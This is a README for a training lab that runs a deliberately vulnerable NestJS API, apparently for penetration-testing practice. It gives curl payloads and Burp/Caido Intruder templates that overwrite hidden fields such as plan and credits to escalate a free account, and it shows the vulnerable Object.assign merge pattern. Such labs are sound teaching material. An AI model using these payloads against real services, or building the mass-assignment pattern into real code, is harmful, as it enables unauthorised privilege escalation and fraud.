# AI Image Generator — Mass Assignment Lab (2026)

This is an educational laboratory on **Mass Assignment** vulnerability in a modern REST API built with NestJS and SQLite.

## Quick Start
     
1. **Install dependencies**:
   ```bash
   npm install
   ```

2. **Environment setup**:
   Create or edit `.env` at the project root:
   ```env
   DATABASE_URL=sqlite:ai-gen-lab.db
   JWT_SECRET=
   PORT=3000
   ```

3. **Start the server**:
   ```bash
   npm run start:dev
   ```
   The server will be available at: `http://localhost:3000`
   
4. **Swagger UI**:
   For interactive API testing, go to:
   `http://localhost:3000/api/docs#/` (or your local IP, e.g., `http://192.168.1.106:3000/api/docs#/`)

---

## API Documentation

All requests must include the `Content-Type: application/json` header. Protected endpoints require the `Authorization: Bearer <JWT_TOKEN>` header.

### 1. Registration (Public)
**Important**: Use the `POST` method.

```bash
curl -X POST http://localhost:3000/users/register \
     -H "Content-Type: application/json" \
     -d '{"username": "hacker", "email": "hacker@example.com", "password": "password123"}'
```
**Response**: Contains the user `id` and `access_token`.

### 2. Authentication (Public)
```bash
curl -X POST http://localhost:3000/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email": "hacker@example.com", "password": "password123"}'
```

### 3. Who am I? (Protected)
The simplest way to get your ID and profile data using only the token.
```bash
curl -H "Authorization: Bearer <TOKEN>" \
     http://localhost:3000/users/me
```

### 4. View your profile (Protected)
```bash
curl -H "Authorization: Bearer <TOKEN>" \
     http://localhost:3000/users/<YOUR_ID>
```
*Note: Returns only public fields (username, fullName, profile, createdAt). Business fields are hidden.*

### 4. Image Generation (Protected)
Demonstrates current account limits and capabilities.

```bash
curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNWMxNDg2My1jZmM5LTQ4MjktOGFkYi1kODM0OWM2OTdhMDIiLCJlbWFpbCI6ImhhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3MDU1NDUzNywiZXhwIjoxNzcwNTU4MTM3fQ.3hw8XhS7ALjeZnCC8sycMZLAxVtRETyET0MxSlzbBJc" \
     http://localhost:3000/users/generate-image
```
*On the free plan you have only 5 credits and a basic model.*

### 5. Vulnerable endpoint: Flat Update (Protected)
Classic Mass Assignment via `Object.assign`.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"plan": "pro", "generationCredits": 999}' \
     http://localhost:3000/users/<YOUR_ID>/flat
```

### 6. Vulnerable endpoint: Nested Update (Protected)
**Main goal of the lab**. Vulnerability when merging nested objects.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"features": {"unlimitedGenerations": true}}' \
     http://localhost:3000/users/<YOUR_ID>/nested
```

### 7. Vulnerable endpoint: Full Object Update (Protected)
**For testing Reflected/Persisted.** Unlike `/flat`, this endpoint returns the *full* user object in the response, including hidden fields like `plan` and `generationCredits`.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"plan": "enterprise"}' \
     http://localhost:3000/users/<YOUR_ID>/full
```

## Vulnerability Discovery Methodology (Tips for Pentesters)

A professional pentester uses multiple information sources to find hidden fields:

### 1. Hints in error messages (Information Leakage)
If you run out of credits, the `generateImage` method returns an error:
`"You have 0 generation credits left. Upgrade to Pro for unlimited access."`
The phrase **"generation credits"** in the message is a classic clue. An experienced researcher will immediately try variants like `generation_credits`, `generationCredits`, or simply `credits`.

### 2. Swagger and documentation
In the Swagger interface (available at `/api/docs#/`) there are often "leaks" in request body examples. In this lab, the example for `PUT /users/{id}/flat` explicitly shows:
```json
{ "plan": "pro", "generationCredits": 999 }
```
In real life, developers often forget to update examples in the documentation, and they become a valuable source of knowledge about internal field names.

### 3. Gap between Input and Output
In the response you see `remainingCredits`, but in the database the field is called `generationCredits`. This is intentional. 
The gap between what we see in the response (Output) and what we can overwrite (Input) is standard. Overcome it through wordlist fuzzing (`wordlist.txt`) and analysis of indirect clues (as in item 1).

### 4. Debugging via server logs (Debug Logging)
In this lab, detailed logging of incoming data is configured in [users.service.ts](file:///e:/caido-plugins/Mass-Assignment-Radar/Mass-Assignment-Radar/lab/src/users/users.service.ts). This allows you to see the process of "poisoning" the object in real time.

When you run a scanner or send requests manually, the server console (`npm run start:dev`) displays logs:

**For endpoint /flat:**
```text
[Mass Assignment] Incoming payload to /flat: { fullName: 'Ivan', plan: 'pro' }
[Mass Assignment] User object after Object.assign: {
  id: '...',
  username: 'hacker',
  plan: 'pro',
  generationCredits: 5
 }
 ```

 **For endpoint /nested:**
 ```text
 [Mass Assignment] Incoming payload to /nested: { features: { unlimitedGenerations: true } }
 [Mass Assignment] User object after nested merge: {
   id: '...',
   features: { unlimitedGenerations: true },
   profile: { ... }
 }
 ```

 **What does this give a pentester?**
- **Visualization of the vulnerability**: You see the moment when "dirty" data from your request (`raw`) penetrates the clean user object.
- **Debugging blind attacks**: If nothing changes in the response, you can check the server logs to understand whether the data got there at all.
- **Understanding the mechanics**: The logs clearly show the difference between `Object.assign` (which just copies everything) and nested object merge.

This is an excellent way to ensure the scanner is doing its job, even if you are testing "blindly" without follow-up verification.

---

## Working in Burp Suite / Caido

####  Field brute-force via Intruder (Flat)
To discover hidden top-level parameters (e.g., `role`, `isAdmin`, `plan`):
1. Send the `PUT /users/<ID>/flat` request to **Intruder**.
2. In the request body, set a marker on the field name:
```http
PUT /users/<ID>/flat HTTP/1.1
Host: localhost:3000
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "§field§": "test_value"
}
```
3. Load `wordlist.txt` and start the attack. If the field exists, it will be overwritten in the DB.

#### 4. Field brute-force via Intruder (Nested)
To discover hidden fields inside the `features` or `profile` object:
1. Send the `PUT /users/<ID>/nested` request to **Intruder**.
2. Set a marker inside the nested object:
```http
PUT /users/<ID>/nested HTTP/1.1
Host: localhost:3000
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "features": {
    "§field§": true
  }
}
```
3. Load `wordlist.txt` and start the attack.

---

## Assignment

1. **Register** and obtain a JWT token.
2. Try generating several images via `/users/generate-image` until you get the `Limit exceeded` error.
3. Use **wordlist.txt** to search for hidden fields in the `features` or `profile` objects.
4. Exploit the vulnerability in `/users/:id/nested` or `/users/:id/flat` to:
   - Become a Pro user (`plan: "pro"`).
   - Get unlimited generations (`features.unlimitedGenerations: true`).
   - Gain priority in the queue (`features.priorityQueue: true`).
5. Verify success by calling `/users/generate-image` again. You should see a message about access to Enterprise models and unlimited credits.

## Tips
- If you receive `401 Unauthorized` during registration — make sure you use **POST**, not GET.
- Fields worth searching: `plan`, `role`, `isAdmin`, `generationCredits`, `features`, `unlimitedGenerations`, `priorityQueue`.
- The `wordlist.txt` file contains 1000+ field names commonly found in modern APIs.

The lab was created to train penetration testers, security researchers, and developers in 2026.

## Author: sp1r1t
